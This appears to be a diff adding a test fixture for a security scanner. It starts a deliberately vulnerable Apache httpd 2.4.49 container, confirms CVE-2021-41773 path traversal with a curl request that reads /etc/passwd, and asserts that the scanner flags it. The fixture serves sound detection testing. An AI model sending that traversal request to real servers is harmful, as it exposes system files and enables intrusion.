@@ -1,0 +1,29 @@
+name: apache-path-traversal
+description: "Apache httpd 2.4.49 with CVE-2021-41773 path traversal — beacon detects directory traversal"
+tags: [apache, cve, path-traversal, authorized]
+
+services:
+  apache:
+    image: httpd:2.4.49
+    ports: ["9231:80"]
+
+ready:
+  cmd: "curl -sf http://localhost:9231/ >/dev/null"
+  timeout: 30s
+  interval: 2s
+
+assertions:
+  - name: exploit-apache-traversal-etc-passwd
+    type: command
+    expect:
+      command: "curl -sf --path-as-is 'http://localhost:9231/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | grep -q root"
+      exit_code: 0
+
+  - name: detects-apache-traversal
+    type: beacon
+    target: localhost:9231
+    args: ["--no-enrich", "--scanners", "portscan", "--deep", "--permission-confirmed", "--ports", "80"]
+    expect:
+      check_id: cve.apache_http_path_traversal
+
+timeout: 5m
